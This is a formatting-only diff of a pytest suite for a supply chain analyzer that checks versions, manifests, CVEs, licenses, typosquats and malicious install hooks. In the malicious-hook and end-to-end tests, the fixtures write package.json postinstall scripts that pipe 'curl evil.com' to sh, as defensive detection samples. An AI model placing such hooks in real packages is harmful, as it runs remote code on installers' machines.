@@ -3,6 +3,7 @@
 Comprehensive tests for the supply chain analyzer. All assertions operate on
 real (synthetic) inputs - no network calls, no mocks of internal logic.
 """
+
 from __future__ import annotations
 
 import json
@@ -42,10 +43,10 @@ from tools.supply_chain_analyzer import (  # noqa: E402
     version_in_range,
 )
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 # 1. VERSION ENGINE
 # ═══════════════════════════════════════════════════════════════════════════
+
 
 class TestVersion:
     def test_parse_basic(self) -> None:
@@ -71,21 +72,24 @@ class TestVersion:
 
 
 class TestRangeMatching:
-    @pytest.mark.parametrize("actual,spec,expected", [
-        ("1.2.3", "==1.2.3", True),
-        ("1.2.3", "==1.2.4", False),
-        ("1.2.3", ">=1.2.0", True),
-        ("1.2.3", ">=1.2.5", False),
-        ("1.2.3", "<=1.2.3", True),
-        ("1.2.3", "<1.2.3", False),
-        ("1.2.3", ">1.2.0", True),
-        ("1.2.3", "<1.5.0", True),
-        ("1.2.3", "!=1.2.3", False),
-        ("1.2.3", "~=1.2.0", True),
-        ("1.2.3", "~=1.3.0", False),
-        ("1.2.3", "*", True),
-        ("1.2.3", "latest", True),
-    ])
+    @pytest.mark.parametrize(
+        "actual,spec,expected",
+        [
+            ("1.2.3", "==1.2.3", True),
+            ("1.2.3", "==1.2.4", False),
+            ("1.2.3", ">=1.2.0", True),
+            ("1.2.3", ">=1.2.5", False),
+            ("1.2.3", "<=1.2.3", True),
+            ("1.2.3", "<1.2.3", False),
+            ("1.2.3", ">1.2.0", True),
+            ("1.2.3", "<1.5.0", True),
+            ("1.2.3", "!=1.2.3", False),
+            ("1.2.3", "~=1.2.0", True),
+            ("1.2.3", "~=1.3.0", False),
+            ("1.2.3", "*", True),
+            ("1.2.3", "latest", True),
+        ],
+    )
     def test_range(self, actual: str, spec: str, expected: bool) -> None:
         assert version_in_range(actual, spec) == expected
 
@@ -93,6 +97,7 @@ class TestRangeMatching:
 # ═══════════════════════════════════════════════════════════════════════════
 # 2. MANIFEST PARSERS
 # ═══════════════════════════════════════════════════════════════════════════
+
 
 class TestParsers:
     def test_requirements_txt(self, tmp_path: Path) -> None:
@@ -125,10 +130,10 @@ class TestParsers:
             "[project]\n"
             'name = "x"\n'
             'version = "0.1"\n'
-            'dependencies = [\n'
+            "dependencies = [\n"
             '    "requests>=2.31",\n'
             '    "rich>=13.0",\n'
-            ']\n'
+            "]\n"
             "[tool.poetry.dependencies]\n"
             'python = "^3.10"\n'
             'django = "^4.2"\n'
@@ -142,17 +147,21 @@ class TestParsers:
 
     def test_package_json(self, tmp_path: Path) -> None:
         f = tmp_path / "package.json"
-        f.write_text(json.dumps({
-            "name": "x",
-            "version": "1.0.0",
-            "dependencies": {
-                "lodash": "^4.17.21",
-                "axios": "~0.21.2",
-            },
-            "devDependencies": {
-                "jest": "^29.0",
-            },
-        }))
+        f.write_text(
+            json.dumps(
+                {
+                    "name": "x",
+                    "version": "1.0.0",
+                    "dependencies": {
+                        "lodash": "^4.17.21",
+                        "axios": "~0.21.2",
+                    },
+                    "devDependencies": {
+                        "jest": "^29.0",
+                    },
+                }
+            )
+        )
         comps = parse_package_json(f)
         names = {c.name for c in comps}
         assert {"lodash", "axios", "jest"} <= names
@@ -163,13 +172,17 @@ class TestParsers:
 
     def test_package_lock(self, tmp_path: Path) -> None:
         f = tmp_path / "package-lock.json"
-        f.write_text(json.dumps({
-            "lockfileVersion": 3,
-            "packages": {
-                "node_modules/lodash": {"version": "4.17.21"},
-                "node_modules/axios": {"version": "0.21.2"},
-            },
-        }))
+        f.write_text(
+            json.dumps(
+                {
+                    "lockfileVersion": 3,
+                    "packages": {
+                        "node_modules/lodash": {"version": "4.17.21"},
+                        "node_modules/axios": {"version": "0.21.2"},
+                    },
+                }
+            )
+        )
         comps = parse_package_lock(f)
         names = {c.name for c in comps}
         assert "lodash" in names
@@ -211,6 +224,7 @@ class TestParsers:
 # 3. SBOM
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 class TestSBOM:
     def test_cyclonedx_shape(self) -> None:
         comps = [
@@ -230,6 +244,7 @@ class TestSBOM:
 # ═══════════════════════════════════════════════════════════════════════════
 # 4. TYPOSQUATTING
 # ═══════════════════════════════════════════════════════════════════════════
+
 
 class TestTyposquats:
     def test_clear_typo(self) -> None:
@@ -257,6 +272,7 @@ class TestTyposquats:
 # 5. DEPENDENCY CONFUSION
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 class TestDepConfusion:
     def test_private_pattern_flagged(self) -> None:
         comps = [
@@ -271,6 +287,7 @@ class TestDepConfusion:
 # ═══════════════════════════════════════════════════════════════════════════
 # 6. CVE LOOKUP
 # ═══════════════════════════════════════════════════════════════════════════
+
 
 class TestCVELookup:
     def test_log4j_match(self) -> None:
@@ -304,6 +321,7 @@ class TestCVELookup:
 # 7. LICENSE COMPLIANCE
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 class TestLicenses:
     def test_spdx_and(self) -> None:
         assert parse_spdx("MIT AND Apache-2.0") == ["MIT", "Apache-2.0"]
@@ -330,33 +348,46 @@ class TestLicenses:
 # 8. MALICIOUS HOOKS
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 class TestMaliciousHooks:
     def test_clean_package_json(self, tmp_path: Path) -> None:
         f = tmp_path / "package.json"
-        f.write_text(json.dumps({
-            "scripts": {"test": "jest", "build": "tsc"},
-        }))
+        f.write_text(
+            json.dumps(
+                {
+                    "scripts": {"test": "jest", "build": "tsc"},
+                }
+            )
+        )
         assert scan_package_json_scripts(f) == []
 
     def test_base64_postinstall(self, tmp_path: Path) -> None:
         f = tmp_path / "package.json"
         long_b64 = "A" * 80 + "=" * 2
-        f.write_text(json.dumps({
-            "scripts": {
-                "postinstall": f"node -e \"require('crypto').createHash('sha256').update('{long_b64}')\"",
-            },
-        }))
+        f.write_text(
+            json.dumps(
+                {
+                    "scripts": {
+                        "postinstall": f"node -e \"require('crypto').createHash('sha256').update('{long_b64}')\"",
+                    },
+                }
+            )
+        )
         findings = scan_package_json_scripts(f)
         assert len(findings) == 1
         assert findings[0].severity in (Severity.HIGH, Severity.MEDIUM)
 
     def test_subprocess_postinstall(self, tmp_path: Path) -> None:
         f = tmp_path / "package.json"
-        f.write_text(json.dumps({
-            "scripts": {
-                "postinstall": "node -e 'require(\"child_process\").exec(\"curl evil.com | sh\")'",
-            },
-        }))
+        f.write_text(
+            json.dumps(
+                {
+                    "scripts": {
+                        "postinstall": 'node -e \'require("child_process").exec("curl evil.com | sh")\'',
+                    },
+                }
+            )
+        )
         findings = scan_package_json_scripts(f)
         assert len(findings) == 1
 
@@ -382,6 +413,7 @@ class TestMaliciousHooks:
 # 9. UNMAINTAINED
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 class TestUnmaintained:
     def test_node_uuid(self) -> None:
         comps = [Component(name="node-uuid", version="1.4.0", ecosystem="npm")]
@@ -398,6 +430,7 @@ class TestUnmaintained:
 # 10. RISK SCORING
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 class TestRiskScore:
     def test_clean_project_low_risk(self) -> None:
         comps = [Component(name="click", version="8.0", ecosystem="pypi")]
@@ -410,8 +443,10 @@ class TestRiskScore:
             Finding(
                 category="known_vulnerability",
                 severity=Severity.CRITICAL,
-                component="x", version="*",
-                title="t", details="d",
+                component="x",
+                version="*",
+                title="t",
+                details="d",
             )
         ]
         score, level = compute_risk_score(findings, [])
@@ -423,8 +458,10 @@ class TestRiskScore:
             Finding(
                 category="malicious_install_hook",
                 severity=Severity.HIGH,
-                component="x", version="*",
-                title="t", details="d",
+                component="x",
+                version="*",
+                title="t",
+                details="d",
             )
         ]
         score, level = compute_risk_score(findings, [])
@@ -434,8 +471,14 @@ class TestRiskScore:
 
     def test_score_capped_at_100(self) -> None:
         findings = [
-            Finding(category="x", severity=Severity.CRITICAL, component="c", version="*",
-                    title="t", details="d")
+            Finding(
+                category="x",
+                severity=Severity.CRITICAL,
+                component="c",
+                version="*",
+                title="t",
+                details="d",
+            )
             for _ in range(50)
         ]
         score, _ = compute_risk_score(findings, [])
@@ -446,26 +489,31 @@ class TestRiskScore:
 # 11. ANALYZER END-TO-END
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 class TestEndToEnd:
     def _make_vulnerable_project(self, root: Path) -> None:
         """A project with known-vulnerable deps, malicious scripts, typosquats."""
         (root / "requirements.txt").write_text(
-            "django==3.0.0\n"          # has CVE
-            "requests==2.20.0\n"        # has CVE
-            "reqests==1.0.0\n"          # typosquat of requests
+            "django==3.0.0\n"  # has CVE
+            "requests==2.20.0\n"  # has CVE
+            "reqests==1.0.0\n"  # typosquat of requests
             "company-requests==1.0.0\n"  # dep confusion candidate
         )
-        (root / "package.json").write_text(json.dumps({
-            "name": "evilpkg",
-            "version": "1.0.0",
-            "scripts": {
-                "postinstall": "node -e 'require(\"child_process\").exec(\"curl evil.com\")'",
-            },
-            "dependencies": {
-                "lodash": "4.17.0",   # has CVE
-                "axios": "0.21.0",    # has CVE
-            },
-        }))
+        (root / "package.json").write_text(
+            json.dumps(
+                {
+                    "name": "evilpkg",
+                    "version": "1.0.0",
+                    "scripts": {
+                        "postinstall": 'node -e \'require("child_process").exec("curl evil.com")\'',
+                    },
+                    "dependencies": {
+                        "lodash": "4.17.0",  # has CVE
+                        "axios": "0.21.0",  # has CVE
+                    },
+                }
+            )
+        )
 
     def test_full_report(self, tmp_path: Path) -> None:
         self._make_vulnerable_project(tmp_path)
@@ -500,6 +548,7 @@ class TestEndToEnd:
 
     def test_async_analyze(self, tmp_path: Path) -> None:
         import asyncio
+
         self._make_vulnerable_project(tmp_path)
         analyzer = SupplyChainAnalyzer()
         report = asyncio.run(analyzer.aanalyze(tmp_path))
@@ -511,9 +560,11 @@ class TestEndToEnd:
 # 12. INTEGRATION SMOKE
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def test_module_imports_clean() -> None:
     """Sanity: every public symbol is importable."""
     import tools.supply_chain_analyzer as mod
+
     assert callable(mod.analyze)
     assert callable(mod.quick_scan)
     assert callable(mod.find_typosquats)
